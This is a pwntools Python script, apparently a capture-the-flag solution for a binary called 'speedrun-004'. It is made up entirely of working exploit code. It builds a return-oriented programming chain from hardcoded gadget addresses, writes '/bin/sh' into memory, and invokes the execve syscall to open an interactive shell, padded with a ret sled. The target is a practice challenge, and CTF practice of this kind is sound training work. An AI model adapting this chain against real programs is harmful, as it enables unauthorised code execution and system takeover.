from pwn import *

target = process("./speedrun-004")
target.sendline("257")
target.recvuntil("yourself?")

ret = p64(0x0000000000400416)
poprdi = 0x0000000000400686
poprdx = 0x000000000044a155
poprsi = 0x0000000000410a93
poprax = 0x0000000000415f04
mov = 0x000000000047f521 #mov qword ptr [rsi], rax ; ret
faza = 0x6b6080
binsh = 0x68732f6e69622f
syscall = 0x000000000040132c

payload = p64(poprax) + p64(binsh) + p64(poprsi) + p64(faza) + p64(mov)
payload +=  p64(poprax) + p64(59) + p64(poprdi) + p64(faza) + p64(poprsi) + p64(0) + p64(poprdx) + p64(0) + p64(syscall)

pay = (((256 - len(payload)) // 8) * ret + payload + "\x00")
print(len(pay))
target.send(pay)
target.interactive()
